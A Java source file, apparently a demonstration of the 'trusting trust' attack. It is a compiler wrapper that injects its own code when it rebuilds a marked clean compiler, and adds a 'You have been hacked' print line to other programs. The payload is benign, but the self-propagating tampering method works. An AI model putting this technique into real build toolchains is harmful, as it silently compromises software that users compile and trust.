
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class DirtyCompiler {
    public static void main(String[] args) throws IOException {

        if (args.length < 1) {
            return;
        }
        String filePath = args[0];

        // here are the core functions of the compiler

        Pattern compilerIdentifierPattern = Pattern.compile("// 2jndaw9fiasndjf393u48fun24rj84jfu4h9");
        Pattern systemOutPattern = Pattern.compile("System.out.println([\"|\\w|\\W]+);");
        Path tempDirectory = Files.createTempDirectory(null);

        String tempFileName = null, fullFileName, fileName = null;

        try {
            // Loading the source file
            File fileToCompile = new File(filePath);
            Scanner fileToCompileReader = new Scanner(fileToCompile);

            // Fetching different parts of the name of the file
            fullFileName = fileToCompile.getName();
            fileName = fullFileName.substring(0, fullFileName.lastIndexOf(".java"));
            tempFileName = String.format("%s/%s", tempDirectory, fullFileName);

            FileWriter tempFileWriter = new FileWriter(tempFileName);
            boolean isBestCompiler = false;

            StringBuilder builder = new StringBuilder();
            //Read each line of the file
            while (fileToCompileReader.hasNextLine()) {
                String data = fileToCompileReader.nextLine();
                Matcher mBestCompiler = compilerIdentifierPattern.matcher(data);
                //If the file we are compiling is the clean compiler inject the code of this compiler.
                if (mBestCompiler.matches() && !isBestCompiler) {
                    isBestCompiler = true;
                    fileToCompile = new File("./TheCompiler.java");
                    //Copy the content of this compiler into the clean one.
                    fileToCompileReader.close();
                    fileToCompileReader = new Scanner(fileToCompile);
                    continue;
                }
                builder.append(data);
                builder.append("\n");

                if (!isBestCompiler) {
                    Matcher printLineMatcher = systemOutPattern.matcher(data.trim());
                    boolean isPrintLine = printLineMatcher.matches();
                    if (isPrintLine) {
                        builder.append("System.out.println(\"You have been hacked\");\n");
                    }
                }
            }
            //Final content of the compiled file
            fileToCompileReader.close();
            String fileContent = builder.toString();

            //If we are compiling the clean compiler then rename the class name to the original name.
            if (isBestCompiler) {
                fileContent = fileContent.replaceFirst("public class TheCompiler", "public class " + fileName);
            }

            tempFileWriter.write(fileContent);
            tempFileWriter.close();
        } catch (Exception e) {
            System.out.println("An error occurred.");
        }
        try {
            if (tempFileName != null) {
                // Generate the class file for the compiled file
                Runtime rt = Runtime.getRuntime();
                Process pr = rt.exec(String.format("javac %s", tempFileName));
                File classFile = new File(tempFileName.replace("java", "class"));
                File newFileLocation = new File(filePath.replace("java", "class"));
                Thread.sleep(2000);
                //Move the class file to the user's directory
                classFile.renameTo(newFileLocation);
                System.out.println(String.format("Run this to see results: java -cp %s %s", newFileLocation.getParent(), fileName));
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
// nonce